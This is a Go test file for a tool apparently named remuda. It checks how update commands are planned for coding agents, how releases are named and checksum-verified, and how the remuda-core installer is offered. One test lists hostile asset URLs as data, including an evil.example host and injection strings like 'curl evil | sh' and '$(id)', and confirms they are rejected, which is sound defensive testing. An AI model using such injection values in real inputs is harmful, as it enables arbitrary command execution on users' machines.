package updates

import (
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"errors"
	"fmt"
	"strings"
	"testing"

	"github.com/dev1antdev/remuda/internal/health"
	"github.com/dev1antdev/remuda/internal/machines"
	"github.com/dev1antdev/remuda/internal/setup"
)

func TestPlan(t *testing.T) {
	r := &health.Report{Claude: "2.1.285", ClaudeVia: "brew", Codex: "0.160.0", CodexVia: "npm", Herdr: "0.9.1", HerdrVia: "installer"}
	if u, err := Plan("claude", r); err != nil || !strings.Contains(u.Command, "brew update && brew upgrade claude-code") {
		t.Fatalf("claude: %+v %v", u, err)
	}
	if u, err := Plan("codex", r); err != nil || !strings.Contains(u.Command, "@openai/codex@latest") {
		t.Fatalf("codex: %+v %v", u, err)
	}
	if u, err := Plan("herdr", r); err != nil || !strings.Contains(u.Command, "herdr update --handoff") {
		t.Fatalf("herdr: %+v %v", u, err)
	}
	if _, err := Plan("gemini", r); err == nil {
		t.Fatal("gemini is not installed")
	}
	if _, err := Plan("kimi", r); err == nil {
		t.Fatal("kimi is not installed")
	}
	if u, err := Plan("kimi", &health.Report{Kimi: "2.1.1", KimiVia: "native"}); err != nil || !strings.HasSuffix(u.Command, "kimi upgrade -y && kimi --version") {
		t.Fatalf("kimi: %+v %v", u, err)
	}
	if u, _ := Plan("kimi", &health.Report{Kimi: "2.1.1", KimiVia: "npm"}); !strings.Contains(u.Command, "npm install -g @moonshot-ai/kimi-code@latest") {
		t.Fatalf("kimi npm: %s", u.Command)
	}
	if u, err := Plan("agents", r); err != nil || !strings.Contains(u.Command, "Update Claude Code") || strings.Contains(u.Command, "Gemini") {
		t.Fatalf("agents: %+v %v", u, err)
	}
	if u, _ := Plan("agents", r); strings.Count(u.Command, "brew update ||") != 1 || strings.Contains(u.Command, "brew update && brew upgrade") {
		t.Fatalf("agents: brew update once, up front: %s", u.Command)
	}
	if u, _ := Plan("herdr", &health.Report{Herdr: "0.9.3", HerdrVia: "brew"}); !strings.Contains(u.Command, "brew update && brew upgrade herdr && herdr --version &&\nfor a in $(herdr integration status") || !strings.Contains(u.Command, `do herdr integration install "$a"`) || !strings.Contains(u.Command, "done\n#") {
		t.Fatalf("herdr brew: %s", u.Command)
	}
	if ups := Offered(&health.Report{Herdr: "0.9.3", HerdrVia: "installer", HerdrServer: "0.9.1"}, health.Latest{}); len(ups) != 1 || !strings.HasPrefix(ups[0].Note, "The server runs 0.9.1 while 0.9.3 is installed.") {
		t.Fatalf("server note: %+v", ups)
	}
	ups := Offered(r, health.Latest{Claude: "2.1.296", Herdr: "0.9.3"})
	if len(ups) != 3 || !strings.Contains(ups[0].Note, "0.9.1 → 0.9.3") || !strings.Contains(ups[1].Note, "→ 2.1.296") {
		t.Fatalf("updates: %+v", ups)
	}
}

func TestHooksAndPluginsPlans(t *testing.T) {
	r := &health.Report{Herdr: "0.9.5", HerdrVia: "brew", OutdatedHooks: []health.Hook{{Agent: "claude", Have: "v10", Want: "v11"}, {Agent: "codex", Have: "v8", Want: "v10"}}, Plugins: []health.Plugin{{ID: "herdr.push", Source: "dcolinmorgan/herdr-push"}}}
	u, err := Plan("hooks", r)
	if err != nil || !strings.HasSuffix(u.Command, "herdr integration install claude && herdr integration install codex") || !strings.HasPrefix(u.Note, "claude v10 → v11, codex v8 → v10. ") {
		t.Fatalf("hooks: %+v %v", u, err)
	}
	if u, _ := Plan("hooks", &health.Report{OutdatedHooks: []health.Hook{{Agent: "copilot"}}}); !strings.HasPrefix(u.Note, "copilot. ") {
		t.Fatalf("hooks without versions: %+v", u)
	}
	if _, err := Plan("hooks", &health.Report{Herdr: "0.9.5"}); err == nil {
		t.Fatal("current hooks were offered an update")
	}
	p, err := Plan("plugins", r)
	if err != nil || !strings.HasSuffix(p.Command, "herdr plugin update --yes") || !strings.HasPrefix(p.Note, "herdr.push (dcolinmorgan/herdr-push). ") {
		t.Fatalf("plugins: %+v %v", p, err)
	}
	if _, err := Plan("plugins", &health.Report{Herdr: "0.9.3", Plugins: r.Plugins}); err == nil {
		t.Fatal("herdr 0.9.3 has no plugin update, yet one was planned")
	}
	if _, err := Plan("plugins", &health.Report{Herdr: "0.9.5"}); err == nil {
		t.Fatal("no plugin, yet an update was planned")
	}
	var whats []string
	for _, u := range Offered(r, health.Latest{}) {
		whats = append(whats, u.What)
	}
	if strings.Join(whats, " ") != "herdr hooks plugins" {
		t.Fatalf("offered: %v", whats)
	}
}

func TestMissingIntegrationsArePlannedForTheAgentsInstalled(t *testing.T) {
	r := &health.Report{Herdr: "0.9.5", Claude: "2.1.300", Gemini: "0.9.0", Integrations: map[string]string{"claude": "missing", "codex": "missing", "gemini": "current", "pi": "missing"}}
	u, err := Plan("integrations", r)
	if err != nil || !strings.HasSuffix(u.Command, "; herdr integration install claude") || !strings.HasPrefix(u.Note, "claude: installed there without") {
		t.Fatalf("integrations: %+v %v", u, err)
	}
	r.Codex = "0.80.0"
	if u, _ := Plan("integrations", r); !strings.HasSuffix(u.Command, "herdr integration install claude && herdr integration install codex") {
		t.Fatalf("an installed Codex without its hooks is not planned: %s", u.Command)
	}
	for _, none := range []*health.Report{nil, {Claude: "2.1.300", Integrations: map[string]string{"claude": "missing"}}, {Herdr: "0.9.5", Integrations: map[string]string{"claude": "missing"}}, {Herdr: "0.9.5", Claude: "2.1.300"}} {
		if _, err := Plan("integrations", none); err == nil {
			t.Fatalf("hooks were planned with no herdr, no agent or nothing missing: %+v", none)
		}
	}
	var whats []string
	for _, u := range Offered(r, health.Latest{}) {
		whats = append(whats, u.What)
	}
	if strings.Join(whats, " ") != "herdr claude codex gemini integrations" {
		t.Fatalf("offered: %v", whats)
	}
}

func TestAssetName(t *testing.T) {
	for _, c := range []struct{ os, arch, want string }{
		{"macOS 26.6.2", "arm64", "remuda-darwin-arm64"},
		{"darwin", "arm64", "remuda-darwin-arm64"},
		{"Linux 6.8.0-45-generic", "amd64", "remuda-linux-amd64"},
		{"linux", "arm64", "remuda-linux-arm64"},
		{"Windows 10.0.26100", "amd64", "remuda-windows-amd64.exe"}, {"Windows 10.0.26100", "arm64", "remuda-windows-arm64.exe"}, {"FreeBSD 14.1", "amd64", ""},
		{"macOS 26.6.2", "", ""},
		{"", "arm64", ""},
	} {
		if got := AssetName(c.os, c.arch); got != c.want {
			t.Errorf("AssetName(%q, %q) = %q, want %q", c.os, c.arch, got, c.want)
		}
	}
}

func release(tag string, assets map[string]string, checksums string) health.Release {
	return health.Release{Tag: tag, Version: strings.TrimPrefix(tag, "v"), Assets: assets, Checksums: checksums}
}

func TestReleaseUpdate(t *testing.T) {
	download := "https://github.com/dev1antdev/remuda/releases/download/v0.5.0/"
	rel := release("v0.5.0", map[string]string{"remuda-darwin-arm64": download + "remuda-darwin-arm64", "remuda-linux-amd64": download + "remuda-linux-amd64"}, download+"checksums.txt")
	u, ok := ReleaseUpdate("v0.4.0-24-g5dac31e", "macOS 26.6.2", "arm64", rel, false)
	if !ok || u.What != "remuda-release" || u.Title != "Download & install remuda v0.5.0" {
		t.Fatalf("remote: %+v %v", u, ok)
	}
	for _, want := range []string{
		`curl -fsSL --retry 3 -o "$HOME/.local/bin/remuda.new.$$" 'https://github.com/dev1antdev/remuda/releases/download/v0.5.0/remuda-darwin-arm64'`,
		`/v0.5.0/checksums.txt`,
		`awk -v n='remuda-darwin-arm64'`,
		`mv "$HOME/.local/bin/remuda.new.$$" "$HOME/.local/bin/remuda"`,
		`launchctl kickstart -k`,
	} {
		if !strings.Contains(u.Command, want) {
			t.Errorf("remote command lacks %q:\n%s", want, u.Command)
		}
	}
	if strings.Contains(u.Command, "sleep 2") {
		t.Error("a remote restart is not delayed")
	}
	if !strings.Contains(u.Note, "v0.4.0-24-g5dac31e → v0.5.0") || !strings.Contains(u.Note, "checksums") || strings.Contains(u.Note, "serving this page") {
		t.Errorf("remote note: %s", u.Note)
	}
	l, ok := ReleaseUpdate("v0.4.0-24-g5dac31e", "darwin", "arm64", rel, true)
	if !ok || !strings.Contains(l.Command, "sleep 2") || !strings.Contains(l.Command, "launchctl print") || !strings.Contains(l.Note, "serving this page") {
		t.Fatalf("local: %+v", l)
	}
	if _, ok := ReleaseUpdate("v0.5.0", "darwin", "arm64", rel, false); ok {
		t.Error("the same version was offered")
	}
	if _, ok := ReleaseUpdate("v0.5.0-3-gabc1234", "darwin", "arm64", rel, false); ok {
		t.Error("a build past the release was offered the release")
	}
	if _, ok := ReleaseUpdate("v0.4.0", "macOS 26.6.2", "amd64", rel, false); ok {
		t.Error("a platform without an asset was offered")
	}
	if _, ok := ReleaseUpdate("", "darwin", "arm64", rel, false); ok {
		t.Error("a machine without remuda was offered a release")
	}
	if _, ok := ReleaseUpdate("v0.4.0", "darwin", "arm64", health.Release{}, false); ok {
		t.Error("no release known, yet offered")
	}
	for _, bad := range []string{
		`https://evil.example/remuda-darwin-arm64`,
		`https://github.com/someone/else/releases/download/v0.5.0/remuda-darwin-arm64`,
		`https://github.com/dev1antdev/remuda/releases/download/v0.4.0/remuda-darwin-arm64`,
		`https://github.com/dev1antdev/remuda/releases/download/v0.5.0/x"; curl evil | sh; echo "`,
		`https://github.com/dev1antdev/remuda/releases/download/v0.5.0/x'; curl evil | sh; echo '`,
		`http://github.com/dev1antdev/remuda/releases/download/v0.5.0/remuda-darwin-arm64`,
		`https://github.com/dev1antdev/remuda/releases/download/v0.5.0/remuda-darwin-arm64?x=$(id)`,
	} {
		hostile := release("v0.5.0", map[string]string{"remuda-darwin-arm64": bad}, "")
		if _, ok := ReleaseUpdate("v0.4.0", "darwin", "arm64", hostile, false); ok {
			t.Errorf("a release with asset URL %q was offered", bad)
		}
	}
	old := release("v0.6.0", map[string]string{"remuda-darwin-arm64": "https://github.com/dev1antdev/remuda/releases/download/v0.6.0/remuda-darwin-arm64"}, "")
	n, ok := ReleaseUpdate("v0.4.0", "darwin", "arm64", old, false)
	if !ok || !strings.Contains(n.Command, "not verified") || strings.Contains(n.Command, "awk") || !strings.Contains(n.Note, "no checksums.txt") {
		t.Fatalf("no checksums: %+v", n)
	}
}

func TestOfferedIncludesCodeServerWhenInstalled(t *testing.T) {
	r := &health.Report{CodeServer: "4.139.0", Remuda: "v0.8.0"}
	var code *Update
	for _, u := range Offered(r, health.Latest{Code: "4.140.0"}) {
		if u.What == "code" {
			u := u
			code = &u
		}
	}
	if code == nil || !strings.Contains(code.Note, "4.139.0 → 4.140.0") || !strings.Contains(code.Command, remudaThere+`"$r" code install`) {
		t.Fatalf("code update = %+v", code)
	}
	if _, err := Plan("code", &health.Report{CodeServer: "4.140.0"}); err == nil {
		t.Fatal("no remuda on the machine, no installer to run")
	}
	for _, u := range Offered(&health.Report{Remuda: "v0.8.0"}, health.Latest{Code: "4.140.0"}) {
		if u.What == "code" {
			t.Fatal("offered without code-server installed")
		}
	}
}

func TestOfferedIncludesTheMCPRegistrationWhereRemudaIs(t *testing.T) {
	var mcp *Update
	for _, u := range Offered(&health.Report{Remuda: "v0.8.2"}, health.Latest{}) {
		if u.What == "mcp" {
			u := u
			mcp = &u
		}
	}
	if mcp == nil || !strings.Contains(mcp.Command, remudaThere+`"$r" mcp install`) || !strings.Contains(mcp.Note, "claude mcp add") {
		t.Fatalf("mcp row = %+v", mcp)
	}
	if _, err := Plan("mcp", &health.Report{}); err == nil {
		t.Fatal("no remuda on the machine, nothing to register")
	}
}

func TestOfferedIncludesTheStatusLineWrapperWhereClaudeAndRemudaAre(t *testing.T) {
	find := func(r *health.Report) *Update {
		for _, u := range Offered(r, health.Latest{}) {
			if u.What == "statusline" {
				u := u
				return &u
			}
		}
		return nil
	}
	u := find(&health.Report{Remuda: "v0.12.0", Claude: "2.1.318"})
	if u == nil || !strings.HasSuffix(u.Command, `"$r" statusline install`) || !strings.Contains(u.Command, "statusline status") || !strings.Contains(u.Note, "statusline uninstall") {
		t.Fatalf("statusline row = %+v", u)
	}
	if u := find(&health.Report{Remuda: "v0.12.0", Claude: "2.1.318", Statusline: true}); u != nil {
		t.Fatal("offered where it is installed already")
	}
	if u := find(&health.Report{Remuda: "v0.12.0"}); u != nil {
		t.Fatal("offered without Claude Code")
	}
	if u := find(&health.Report{Claude: "2.1.318"}); u != nil {
		t.Fatal("offered without remuda")
	}
}

func TestCoreIsOfferedWhereItIsMissingOrOlder(t *testing.T) {
	health.PinnedCore = "0.2.0"
	t.Cleanup(func() { health.PinnedCore = "" })
	find := func(r *health.Report) *Update {
		for _, u := range Offered(r, health.Latest{}) {
			if u.What == "core" {
				return &u
			}
		}
		return nil
	}
	mac := health.Report{Remuda: "v0.16.0", OS: "macOS 26.1", Arch: "arm64"}
	if u := find(&mac); u == nil || u.Title != "Install remuda-core" || !strings.Contains(u.Command, "remuda-core 0.2.0") || !strings.HasSuffix(u.run(), "\n"+setup.CoreInstaller()) {
		t.Fatalf("a Mac without remuda-core: %+v", u)
	}
	if u := find(&health.Report{OS: "Linux 6.12", Arch: "amd64"}); u == nil || !strings.HasSuffix(u.run(), setup.CoreInstaller()) {
		t.Fatalf("a Linux machine with neither remuda nor remuda-core is not offered this remuda's own installer: %+v", u)
	}
	if sum := sha256.Sum256([]byte(find(&mac).run())); !strings.Contains(find(&mac).Command, hex.EncodeToString(sum[:8])) {
		t.Fatal("the command shown does not name the installer's digest")
	}
	if naming("# remuda-core 0.2.0", "one installer") == naming("# remuda-core 0.2.0", "another installer") {
		t.Fatal("an installer changed under the same version leaves the command shown as it was: a stale Run would pass")
	}
	// Update everywhere sends every step's command back on Run, under the server's 1 MB a request: a fleet's worth of
	// installs must fit, so the installer itself never travels in the command
	u := find(&mac)
	steps := make([]Step, 500)
	for i := range steps {
		steps[i] = Step{Machine: fmt.Sprintf("machine-%d", i), Label: "A machine", What: u.What, Title: u.Title, Command: u.Command}
	}
	if body, _ := json.Marshal(map[string]any{"steps": steps}); len(body) >= 1<<20 {
		t.Fatalf("500 installs make a request of %d bytes", len(body))
	}
	older := mac
	older.RemudaCore = "0.1.9"
	if u := find(&older); u == nil || u.Title != "Update remuda-core" || !strings.Contains(u.Note, "0.1.9 → 0.2.0") {
		t.Fatalf("an older remuda-core: %+v", u)
	}
	for name, r := range map[string]health.Report{
		"current":         {Remuda: "v0.16.0", OS: "Linux 6.12", Arch: "arm64", RemudaCore: "0.2.0"},
		"newer":           {Remuda: "v0.16.0", OS: "Linux 6.12", Arch: "amd64", RemudaCore: "0.3.0"},
		"Windows on arm":  {Remuda: "v0.16.0", OS: "Windows 11 Pro", Arch: "arm64"},
		"a 32-bit Linux":  {Remuda: "v0.16.0", OS: "Linux 6.1", Arch: "armv7l"},
		"vitals not read": {},
	} {
		if u := find(&r); u != nil {
			t.Errorf("%s: offered %+v", name, u)
		}
	}
	if u := find(&health.Report{Remuda: "v0.16.0", OS: "Windows 11 Pro", Arch: "amd64"}); u == nil {
		t.Error("a Windows PC on x86-64 is not offered remuda-core")
	}
}

// An agent updated on a machine connected without its remuda-core has no chat this remuda sees to move: the update
// went through, and the job says so rather than failing on the chats.
func TestAnAgentUpdateWithoutTheCoreMovesNoChatAndStandsDone(t *testing.T) {
	var said []string
	say := func(line string) { said = append(said, line) }
	noCore := &machines.NoCoreError{Reason: errors.New("remuda-core is not installed on box")}
	if err := chatsMoved(fmt.Errorf("restart: %w", noCore), say); err != nil {
		t.Fatalf("the update failed on the missing core: %v", err)
	}
	if len(said) != 1 || !strings.Contains(said[0], "remuda-core is not installed on box") {
		t.Fatalf("the log says %q", said)
	}
	if err := chatsMoved(errors.New("herdr refused"), say); err == nil {
		t.Fatal("another failure of the chats passed as done")
	}
}
